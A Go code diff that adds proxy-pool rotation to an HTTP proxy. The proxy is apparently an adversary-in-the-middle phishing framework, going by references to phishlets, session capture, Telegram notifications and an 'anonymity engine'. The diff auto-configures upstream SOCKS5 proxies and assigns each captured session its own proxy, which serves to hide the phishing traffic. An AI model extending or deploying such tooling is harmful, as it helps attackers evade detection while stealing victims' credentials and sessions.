@@ -253,6 +253,44 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	// Start session janitor for stale session cleanup (releases orphaned proxies)
 	go p.startSessionJanitor()
 
+	// Register callback to auto-set single proxy when proxy pool is enabled
+	SetProxyPoolEnabledCallback(func(enabled bool) {
+		if enabled && p.anonymityEngine != nil && p.anonymityEngine.proxyRotator != nil {
+			// Get first working proxy from pool and set it as single proxy
+			proxy := p.anonymityEngine.proxyRotator.GetFirstWorkingProxy()
+			if proxy != nil {
+				proxyType := proxy.Type
+				if proxyType == "" {
+					proxyType = "socks5"
+				}
+				err := p.setProxy(true, proxyType, proxy.Host, proxy.Port, proxy.Username, proxy.Password)
+				if err != nil {
+					log.Error("[ProxyPool] Failed to auto-set single proxy: %v", err)
+				} else {
+					// Also update config for persistence
+					p.cfg.SetProxyType(proxyType)
+					p.cfg.SetProxyAddress(proxy.Host)
+					p.cfg.SetProxyPort(proxy.Port)
+					p.cfg.SetProxyUsername(proxy.Username)
+					p.cfg.SetProxyPassword(proxy.Password)
+					p.cfg.EnableProxy(true)
+					log.Success("[ProxyPool] Auto-configured single proxy from pool: %s://%s:%d", proxyType, proxy.Host, proxy.Port)
+					if proxy.Username != "" {
+						log.Info("[ProxyPool] Proxy authentication enabled (user: %s)", proxy.Username)
+					}
+				}
+			} else {
+				log.Warning("[ProxyPool] No working proxy found in pool to auto-configure")
+			}
+		} else if !enabled {
+			// Optionally disable single proxy when pool is disabled
+			// (commented out to preserve user's manual proxy settings)
+			// p.setProxy(false, "", "", 0, "", "")
+			// p.cfg.EnableProxy(false)
+			log.Info("[ProxyPool] Pool disabled - single proxy settings preserved")
+		}
+	})
+
 	// Start auto-notifier daemon for 100% reliable automatic telegram notifications
 	// DISABLED: OLD AUTO-NOTIFIER COMPLETELY REMOVED
 	// Using NEW SessionFinalizer instead for BULLETPROOF validation
@@ -756,6 +794,23 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 								session, err := NewSession(pl.Name)
 								if err == nil {
+									// Assign proxy from pool for session-sticky routing
+									if p.anonymityEngine != nil && p.anonymityEngine.proxyRotator != nil && p.anonymityEngine.proxyRotator.IsEnabled() {
+										proxyInfo, err := p.anonymityEngine.proxyRotator.GetAvailableProxy(session.Id)
+										if err == nil && proxyInfo != nil {
+											session.AssignedProxy = &SessionProxy{
+												Type:     proxyInfo.Type,
+												Host:     proxyInfo.Host,
+												Port:     proxyInfo.Port,
+												Username: proxyInfo.Username,
+												Password: proxyInfo.Password,
+											}
+											log.Info("[ProxyPool] Assigned proxy %s:%d to session %s", proxyInfo.Host, proxyInfo.Port, session.Id)
+										} else if err != nil {
+											log.Warning("[ProxyPool] Failed to assign proxy to session: %v", err)
+										}
+									}
+
 									// set params from url arguments
 									p.extractParams(session, req.URL)
 
